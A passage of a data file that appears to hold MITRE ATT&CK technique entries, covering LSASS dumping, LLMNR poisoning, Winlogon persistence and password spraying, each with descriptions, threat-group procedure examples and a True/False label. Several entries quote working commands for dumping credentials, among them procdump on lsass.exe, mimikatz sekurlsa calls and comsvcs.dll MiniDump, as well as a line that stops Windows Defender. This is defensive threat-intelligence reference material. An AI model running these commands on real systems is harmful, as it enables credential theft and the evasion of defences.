Logs to hinder forensic investigation.', '[Dragonfly 2.0] cleared Windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs. The actors also deleted specific Registry keys.']",False
T1585.002,Email Accounts,"Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct [Phishing for Information] or [Phishing] Establishing email accounts may also allow adversaries to abuse free services – such as trial periods – to [Acquire Infrastructure] for follow-on purposes.  Adversaries may also take steps to cultivate a persona around the email account, such as through use of [Social Media Accounts] to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: [Domains]  To decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services. ","['During [Operation Honeybee] attackers created email addresses to register for a free account for a control server used for the implants. ', '[Kimsuky] has created email accounts for phishing operations.', '[Magic Hound] has established email accounts using fake personas for spearphishing operations.', 'For [Operation Wocao] the threat actors registered email accounts to use during the campaign.', 'During [Operation Dream Job] [Lazarus Group] created fake email accounts to correspond with fake LinkedIn personas; [Lazarus Group] also established email accounts to match those of the victim as part of their BEC attempt.', '[Mustang Panda] has leveraged the legitimate email marketing service SMTP2Go for phishing campaigns.', '[Leviathan] has created new email accounts for targeting efforts.', '[Silent Librarian] has established e-mail accounts to receive e-mails forwarded from compromised accounts.', '[EXOTIC LILY] has created e-mail accounts to spoof targeted organizations.', '[APT1] has created email accounts for later use in social engineering, phishing, and when registering domains.', '[Wizard Spider] has leveraged ProtonMail email addresses in ransom notes when delivering [Ryuk] ransomware.', '[HEXANE] has established email accounts for use in domain registration including for ProtonMail addresses.', '[Indrik Spider] has created email accounts to communicate with their ransomware victims, to include providing payment and decryption details.', '[Sandworm Team] has created email accounts that mimic legitimate organizations for its spearphishing operations.', 'For [FunnyDream] the threat actors likely established an identified email account to register a variety of domains that were used during the campaign.', 'For [Operation Dust Storm] the threat actors established email addresses to register domains for their operations.', '[Lazarus Group] has created new email accounts for spearphishing operations.']",False
T1557.001,LLMNR/NBT-NS Poisoning and SMB Relay,"By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.   Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.   Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing] and crack the hashes offline through [Brute Force] to obtain the plaintext passwords.  In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.   Several tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder]","['[Impacket] modules like ntlmrelayx and smbrelayx can be used in conjunction with [Network Sniffing] and [LLMNR/NBT-NS Poisoning and SMB Relay] to gather NetNTLM credentials for [Brute Force] or relay attacks that can gain code execution.', '[Empire] can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks.', '[PoshC2] can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks.', '[Lazarus Group] executed [Responder] using the command <code>[Responder file path] -i [IP address] -rPv</code> on a compromised host to harvest credentials and move laterally.', '[Wizard Spider] has used the Invoke-Inveigh PowerShell cmdlets, likely for name service poisoning.', '[Pupy] can sniff plaintext network credentials and use NBNS Spoofing to poison name services.', '[Responder] is used to poison name services to gather hashes and credentials from systems within a local network.']",False
T1003.001,LSASS Memory,"Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement] using [Use Alternate Authentication Material]  As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.  For example, on the target host use procdump:  * <code>procdump -ma lsass.exe lsass_dump</code>  Locally, mimikatz can be run using:  * <code>sekurlsa::Minidump lsassdump.dmp</code> * <code>sekurlsa::logonPasswords</code>  Built-in Windows tools such as `comsvcs.dll` can also be used:  * <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID  lsass.dmp full</code>  Similar to [Image File Execution Options Injection] the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).  Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.  The following SSPs can be used to access credentials:  * Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package. * Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. * Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later. * CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services. ","['[Indrik Spider] used [Cobalt Strike] to carry out credential dumping using ProcDump.', 'During [Operation Wocao] threat actors used ProcDump to dump credentials from memory.', '[OilRig] has used credential dumping tools such as [Mimikatz] to steal credentials to accounts logged into the compromised system and to Outlook Web Access.', '[Cleaver] has been known to dump credentials using Mimikatz and Windows Credential Editor.', '[Leafminer] used several tools for retrieving login and password information, including LaZagne and Mimikatz.', '[Threat Group-3390] actors have used a modified version of [Mimikatz] called Wrapikatz to dump credentials. They have also dumped credentials from domain controllers.', '[SILENTTRINITY] can create a memory dump of LSASS via the `MiniDumpWriteDump Win32` API call.', '[APT1] has been known to use credential dumping using [Mimikatz]', 'During [Cutting Edge] threat actors used Task Manager to dump LSASS memory from Windows devices to disk.', '[Leviathan] has used publicly available tools to dump password hashes, including ProcDump and WCE.', '[FIN8] harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE).', '[LaZagne] can perform credential dumping from memory to obtain account and password information.', '[HAFNIUM] has used <code>procdump</code> to dump the LSASS process memory.', '[Blue Mockingbird] has used Mimikatz to retrieve credentials from LSASS memory.', '[Lslsass] can dump active logon session password hashes from the lsass process.', '[Lizar] can run [Mimikatz] to harvest credentials. ', '[Volt Typhoon] has attempted to access hashed credentials from the LSASS process memory space.', '[Whitefly] has used [Mimikatz] to obtain credentials.', '[APT33] has used a variety of publicly available tools like [LaZagne] [Mimikatz] and ProcDump to dump credentials.', ""[FIN13] has obtained memory dumps with ProcDump to parse and extract credentials from a victim's LSASS process memory with [Mimikatz]"", ""[Bad Rabbit] has used [Mimikatz] to harvest credentials from the victim's machine."", '[APT32] used Mimikatz and customized versions of Windows Credential Dumper to harvest credentials.', '[CozyCar] has executed [Mimikatz] to harvest stored credentials from the victim and further victim penetration.', 'SecretsDump and [Mimikatz] modules within [Impacket] can perform credential dumping to obtain account and password information.', '[GALLIUM] used a modified version of [Mimikatz] along with a PowerShell-based [Mimikatz] to dump credentials on the victim machines.', '[NotPetya] contains a modified version of [Mimikatz] to help gather credentials that are later used for lateral movement.', '[Pupy] can execute Lazagne as well as [Mimikatz] using PowerShell.', '[APT5] has used the Task Manager process to target LSASS process memory in order to obtain NTLM password hashes. [APT5] has also dumped clear text passwords and hashes from memory using [Mimikatz] hosted through an RDP mapped drive.', '[Cobalt Strike] can spawn a job to inject into LSASS memory and dump password hashes.', '[PoshC2] contains an implementation of [Mimikatz] to gather credentials from memory.', '[BRONZE BUTLER] has used various tools (such as Mimikatz and WCE) to perform credential dumping.', '[Windows Credential Editor] can dump credentials.', '[APT39] has used Mimikatz, Windows Credential Editor and ProcDump to dump credentials.', 'In the [Triton Safety Instrumented System Attack] [TEMP.Veles] used Mimikatz.', '[Magic Hound] has stolen domain credentials by dumping LSASS process memory using Task Manager, comsvcs.dll, and from a Microsoft Active Directory Domain Controller using [Mimikatz]', '[Earth Lusca] has used ProcDump to obtain the hashes of credentials by dumping the memory of the LSASS process.', '[PoetRAT] used voStro.exe, a compiled pypykatz (Python version of [Mimikatz] to steal credentials.', '[Emotet] has been observed dropping password grabber modules including [Mimikatz] ', '[PLATINUM] has used keyloggers that are also capable of dumping credentials.', '[Fox Kitten] has used prodump to dump credentials from LSASS.', '[Net Crawler] uses credential dumpers such as [Mimikatz] and [Windows Credential Editor] to extract cached credentials from Windows systems.', '[Silence] has used the Farse6.1 utility (based on [Mimikatz] to extract credentials from lsass.exe.', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] used [Mimikatz] to capture and use legitimate credentials.', '[Pysa] can perform OS credential dumping using [Mimikatz]', '[Mimikatz] performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSASS Memory.', '[Sandworm Team] has used its plainpwd tool, a modified version of [Mimikatz] and comsvcs.dll to dump Windows credentials from system memory.\t', '[MuddyWater] has performed credential dumping with [Mimikatz] and procdump64.exe.', '[Wizard Spider] has dumped the lsass.exe memory to harvest credentials with the use of open-source tool [LaZagne]', '[Aquatic Panda] has attempted to harvest credentials through LSASS memory dumping.', '[Ke3chang] has dumped credentials, including by using [Mimikatz]', '[APT3] has used a tool to dump credentials by injecting itself into lsass.exe and triggering with the argument ""dig.""', '[APT41] has used hashdump, [Mimikatz] and the Windows Credential Editor to dump password hashes from memory and authenticate to other user accounts.', '[Empire] contains an implementation of [Mimikatz] to gather credentials from memory.', '[Daserf] leverages [Mimikatz] and [Windows Credential Editor] to steal credentials.', '[FIN6] has used [Windows Credential Editor] for credential dumping.\t ', '[Mafalda] can dump password hashes from `LSASS.exe`.', '[APT28] regularly deploys both publicly available (ex: [Mimikatz] and custom password retrieval tools on victims. They have also dumped the LSASS process memory using the MiniDump function.', '[Olympic Destroyer] contains a module that tries to obtain credentials from LSASS, similar to [Mimikatz] These credentials are used with [PsExec] and [Windows Management Instrumentation] to help the malware propagate itself across a network.', '[Kimsuky] has gathered credentials using [Mimikatz] and ProcDump.', '[Okrum] was seen using MimikatzLite to perform credential dumping.', '[PowerSploit] contains a collection of Exfiltration modules that can harvest credentials using [Mimikatz]', 'During the [C0032] campaign, [TEMP.Veles] used Mimikatz and a custom tool, SecHack, to harvest credentials.', '[GreyEnergy] has a module for [Mimikatz] to collect Windows credentials from the victim’s machine.', '[TEMP.Veles] has used [Mimikatz] and a custom tool, SecHack, to harvest credentials. ', '[Stolen Pencil] gathers credentials using [Mimikatz] and Procdump. ', '[Operation Wocao] has used ProcDump to dump credentials from memory.', '[Lazarus Group] leveraged [Mimikatz] to extract Windows Credentials of currently logged-in users and steals passwords stored in browsers. [Lazarus Group] has also used a custom version [Mimikatz] to capture credentials. ']",False
T1053.001,At (Linux),"Adversaries may abuse the [at] utility to perform task scheduling for initial, recurring, or future execution of malicious code. The [at] command within Linux operating systems enables administrators to schedule tasks.  An adversary may use [at] in Linux environments to execute programs at system startup or on a scheduled basis for persistence. [at] can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.  Adversaries may also abuse [at] to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at] may also be used for [Privilege Escalation] if the binary is allowed to run as superuser via <code>sudo</code>.",[],True
T1547.011,Plist Modification,"Adversaries can modify property list files (plist files) to execute their code as part of establishing persistence. Plist files are used by macOS applications to store properties and configuration settings for applications and services. Applications use information plist files, <code>Info.plist</code>, to tell the operating system how to handle the application at runtime using structured metadata in the form of keys and values. Plist files are formatted in XML and based on Apple's Core Foundation DTD and can be saved in text or binary format.   Adversaries can modify paths to executed binaries, add command line arguments, and insert key/pair values to plist files in auto-run locations which execute upon user logon or system startup. Through modifying plist files in these locations, adversaries can also execute a malicious dynamic library (dylib) by adding a dictionary containing the <code>DYLD_INSERT_LIBRARIES</code> key combined with a path to a malicious dylib under the <code>EnvironmentVariables</code> key in a plist file. Upon user logon, the plist is called for execution and the malicious dylib is executed within the process space. Persistence can also be achieved by modifying the <code>LSEnvironment</code> key in the application's <code>Info.plist</code> file.","['[XCSSET] uses the <code>plutil</code> command to modify the <code>LSUIElement</code>, <code>DFBundleDisplayName</code>, and <code>CFBundleIdentifier</code> keys in the <code>/Contents/Info.plist</code> file.', '[LoudMiner] used plists to execute shell scripts and maintain persistence on boot. [LoudMiner] also added plist files in <code>/Library/LaunchDaemons</code> with KeepAlive set to true, which would restart the process if stopped.', '[NETWIRE] can persist via startup options for Login items.', '[Dok] persists via a plist login item.']",True
T1134.002,Create Process with Token,"Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.  Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via [Token Impersonation/Theft] or created via [Make and Impersonate Token] before being used to create a process.  While this technique is distinct from [Token Impersonation/Theft] the techniques can be used in conjunction where a token is duplicated and then used to create a new process.","['[Azorult] can call WTSQueryUserToken and CreateProcessAsUser to start a new process with local system privileges.', '[Turla] RPC backdoors can impersonate or steal process tokens before executing commands.\t', '[PipeMon] can attempt to gain administrative privileges using token impersonation.', ""[Lazarus Group] keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call <code>CreateProcessAsUserA</code> under that user's context."", '[PoshC2] can use Invoke-RunAs to make tokens.', '[Aria-body] has the ability to execute a process using <code>runas</code>.', '[REvil] can launch an instance of itself with administrative rights using runas.', '[ZxShell] has a command called RunAs, which creates a new process as another user or process context. ', 'The [WhisperGate] third stage can use the AdvancedRun.exe tool to execute commands in the context of the Windows TrustedInstaller group via `%TEMP%\\AdvancedRun.exe"" /EXEFilename ""C:\\Windows\\System32\\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" /RunAs 8 /Run`.', '[KONNI] has duplicated the token of a high integrity process to spawn an instance of cmd.exe under an impersonated user. ', '[Bankshot] grabs a user token using WTSQueryUserToken and then creates a process by impersonating a logged-on user.', '[Empire] can use <code>Invoke-RunAs</code> to make tokens.']",False
T1548.001,Setuid and Setgid,"An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively. Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.  Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification] The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgid bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used.  Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future. This abuse is often part of a ""shell escape"" or other actions to bypass an execution environment with restricted permissions.  Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery] The setuid and setguid bits are indicated with an ""s"" instead of an ""x"" when viewing a file's attributes via <code>ls -l</code>. The <code>find</code> command can also be used to search for such files. For example, <code>find / -perm +4000 2>/dev/null</code> can be used to find files with setuid set and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries that have these bits set may then be abused by adversaries.","['[Keydnap] adds the setuid flag to a binary so it can easily elevate in the future.', '[Exaramel for Linux] can execute commands with high privileges via a specific binary with setuid functionality.']",False
T1547.004,Winlogon Helper DLL,"Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\Software[\\Wow6432Node\\]\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> and <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> are used to manage additional helper programs and functionalities that support Winlogon.   Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse:   * Winlogon\Notify - points to notification package DLLs that handle Winlogon events * Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on * Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on  Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.","['[Gazer] can establish persistence by setting the value “Shell” with “explorer.exe, %malware_pathfile%” under the Registry key <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</code>.', ' [DarkTortilla] has established persistence via the `Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon` registry key.', 'A [Dipsind] variant registers as a Winlogon Event Notify DLL to establish persistence.', '[Wizard Spider] has established persistence using Userinit by adding the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.', '[Bazar] can use Winlogon Helper DLL to establish persistence.', '[Remexi] achieves persistence using Userinit by adding the Registry key <code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code>.', '[Revenge RAT] creates a Registry key at <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> to survive a system reboot.', '[Tropic Trooper] has created the Registry key <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> and sets the value to establish persistence.', '[Turla] established persistence by adding a Shell value under the Registry key <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</code>.', '[KeyBoy] issues the command <code>reg add “HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon”</code> to achieve persistence. ', '[Cannon] adds the Registry key <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</code> to establish persistence.']",False
T1021.003,Distributed Component Object Model,"Adversaries may use [Valid Accounts] to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.  The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.  Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. By default, only Administrators may remotely activate and launch COM objects through DCOM.  Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications as well as other Windows objects that contain insecure methods. DCOM can also execute macros in existing documents and may also invoke [Dynamic Data Exchange] (DDE) execution directly through a COM created instance of a Microsoft Office application, bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation] ","['[Empire] can utilize <code>Invoke-DCOM</code> to leverage remote COM execution for lateral movement.', '[SILENTTRINITY] can use `System` namespace methods to execute lateral movement using DCOM.', '[Cobalt Strike] can deliver Beacon payloads for lateral movement by leveraging remote COM execution.', '[Cobalt Strike] can deliver ""beacon"" payloads for lateral movement by leveraging remote COM execution.']",False
T1110.003,Password Spraying,"Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords.   Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:  * SSH (22/TCP) * Telnet (23/TCP) * FTP (21/TCP) * NetBIOS / SMB / Samba (139/TCP & 445/TCP) * LDAP (389/TCP) * Kerberos (88/TCP) * RDP / Terminal Services (3389/TCP) * HTTP/HTTP Management Services (80/TCP & 443/TCP) * MSSQL (1433/TCP) * Oracle (1521/TCP) * MySQL (3306/TCP) * VNC (5900/TCP)  In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.  In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625.","['[Bad Rabbit] <code>infpub.dat</code> file uses NTLM login credentials to brute force Windows machines.', '[CrackMapExec] can brute force credential authentication by using a supplied list of usernames and a single password.', '[Linux Rabbit] brute forces SSH passwords in order to attempt to gain access and install its malware onto the server. ', '[APT29] has conducted brute force password spray attacks.', '[HEXANE] has used password spraying attacks to obtain valid credentials.', '[Lazarus Group] malware attempts to connect to Windows shares for lateral movement by using a generated list of usernames, which center around permutations of the username Administrator, and weak passwords.', '[APT33] has used password spraying to gain access to target systems.', '[Silent Librarian] has used collected lists of names and e-mail accounts to use in password spraying attacks against private sector targets.', ""[Chimera] has used multiple password spraying attacks against victim's remote services to obtain valid user and administrator accounts."", '[MailSniper] can be used for password spraying against Exchange and Office 365.', '[Leafminer] used a tool called Total SMB BruteForcer to perform internal password spraying.', '[APT28] has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks. [APT28] has also used a Kubernetes cluster to conduct distributed, large-scale password spray attacks.', '[Sandworm Team] has used a script to attempt RPC authentication against a number of hosts. ']",False
T1090.002,External Proxy,"Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN] ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.  External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.","['[QUIETEXIT] can proxy traffic via SOCKS.', '[APT39] has used various tools to proxy C2 communications.', '[ShimRat] can use pre-configured HTTP proxies.', '[QakBot] has a module that can proxy C2 communications.', '[APT28] used other victims as proxies to relay command traffic, for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router. [APT28] has also used a machine to relay and obscure communications between [CHOPSTICK] and their server.', '[FIN5] maintains access to victim environments by using [FLIPSIDE] to create a proxy for a backup RDP tunnel.', '[Tonto Team] has routed their traffic through an external server in order to obfuscate their location.', '[Mythic] can leverage a modified SOCKS5 proxy to tunnel egress C2 traffic.', 'The [Winnti for Windows] HTTP/S C2 mode can make use of an external proxy.', '[Lazarus Group] has used multiple proxies to obfuscate network traffic from victims.', ""[menuPass] has used a global service provider's IP as a proxy for C2 traffic from a victim."", 'An [APT3] downloader establishes SOCKS5 connections for its initial C2.', '[Regin] leveraged several compromised universities as proxies to obscure its origin.', '[POWERSTATS] has connected to C2 servers through proxies.', '[Silence] has used ProxyBot, which allows the attacker to redirect traffic from the current node to the backconnect server via Sock4\\Socks5.\t', '[Okrum] can identify proxy servers configured and used by the victim, and use it to make HTTP requests to C2 its server.', '[GALLIUM] used a modified version of [HTRAN] to redirect connections between networks.', '[APT29] uses compromised residential endpoints as proxies for defense evasion and network access.', '[MuddyWater] has controlled [POWERSTATS] from behind a proxy network to obfuscate the C2 location. [MuddyWater] has used a series of compromised websites that victims connected to randomly to relay information to command and control (C2).', '[TrickBot] has been known to reach a command and control server via one of nine proxy IP addresses.  ', '[InvisiMole] InvisiMole can identify proxy servers used by the victim and use them for C2 communication.']",False
T1056.003,Web Portal Capture,"Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.  This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services] and [Valid Accounts] or as part of the initial compromise by exploitation of the externally facing web service.","['In the [Triton Safety Instrumented System Attack] [TEMP.Veles] captured credentials as they were being changed by redirecting text-based login codes to websites they controlled.', '[WARPWIRE] can capture credentials submitted during the web logon process in order to access layer seven applications such as RDP.', 'The [IceApple] OWA credential logger can monitor for OWA authentication requests and log the credentials.', 'During [Cutting Edge] threat actors modified the JavaScript loaded by the Ivanti Connect Secure login page to capture credentials entered.']",
T1589.002,Email Addresses,"Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.  Adversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media] or [Search Victim-Owned Websites] Email addresses could also be enumerated via more active means (i.e. [Active Scanning] such as probing and analyzing responses from authentication services that may reveal valid usernames in a system. For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.  Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains] or [Phishing for Information] establishing operational resources (ex: [Email Accounts] and/or initial access (ex: [Phishing] or [Brute Force] via [External Remote Services]","['[TA551] has used spoofed company emails that were acquired from email clients on previously infected hosts to target other individuals.', '[Lazarus Group] collected email addresses belonging to various departments of a targeted organization which were used in follow-on phishing campaigns.', '[HAFNIUM] has collected e-mail addresses for users they intended to target.', ""[Magic Hound] has identified high-value email accounts in academia, journalism, NGO's, foreign policy, and national security for targeting."", '[Silent Librarian] has collected e-mail addresses from targeted organizations from open Internet searches.', '[Kimsuky] has collected valid email addresses that were subsequently used in spearphishing campaigns.', '[AADInternals] can check for the existence of user email addresses using public Microsoft APIs.', '[HEXANE] has targeted executives, human resources staff, and IT personnel for spearphishing. ', '[LAPSUS$] has gathered employee email addresses, including personal accounts, for social engineering and initial access efforts.', ""[EXOTIC LILY] has gathered targeted individuals' e-mail addresses through open source research and website contact forms."", '[APT32] has collected e-mail addresses for activists and bloggers in order to target them with spyware.', '[Sandworm Team] has obtained valid emails addresses while conducting research against target organizations that were subsequently used in spearphishing campaigns.', '[MuddyWater] has specifically targeted government agency employees with spearphishing e-mails.\t ']",False
T1598.004,Spearphishing Voice,"Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Impersonation] and/or creating a sense of urgency or alarm for the recipient.  All forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or ""vishing""), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.  Victims may also receive phishing messages that direct them to call a phone number (""callback phishing"") where the adversary attempts to collect confidential information.  Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains] or [Search Victim-Owned Websites] to tailor pretexts to be even more persuasive and believable for the victim.","['During [C0027] [Scattered Spider] used phone calls to instruct victims to navigate to credential-harvesting websites.', ""[LAPSUS$] has called victims' help desk to convince the support personnel to reset a privileged account’s credentials."", 'During [C0027] [Scattered Spider] used phone calls to instruct victims to navigate to credential-harvesting websites.  [Scattered Spider] has also called employees at target organizations and compelled them to navigate to fake login portals using adversary-in-the-middle toolkits.']",False
T1003.005,Cached Domain Credentials,"Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.  On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash. The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking] to recover the plaintext password.  On Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at `/var/lib/sss/db/cache.[domain].ldb` for SSSD or `/var/opt/quest/vas/authcache/vas_auth.vdb` for Quest. Adversaries can use utilities, such as `tdbdump`, on these database files to dump the cached hashes and use [Password Cracking] to obtain the plaintext password.   With SYSTEM or sudo access, the tools/utilities such as [Mimikatz] [Reg] and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials.  Note: Cached credentials for Windows Vista are derived using PBKDF2.","['[Okrum] was seen using modified Quarks PwDump to perform credential dumping.', '[APT33] has used a variety of publicly available tools like [LaZagne] to gather credentials.', '[Leafminer] used several tools for retrieving login and password information, including LaZagne.', '[Cachedump] can extract cached password hashes from cache entry information.', '[LaZagne] can perform credential dumping from MSCache to obtain account and password information.', '[OilRig] has used credential dumping tools such as [LaZagne] to steal credentials to accounts logged into the compromised system and to Outlook Web Access.', '[Pupy] can use Lazagne for harvesting credentials.', '[MuddyWater] has performed credential dumping with [LaZagne]']",False
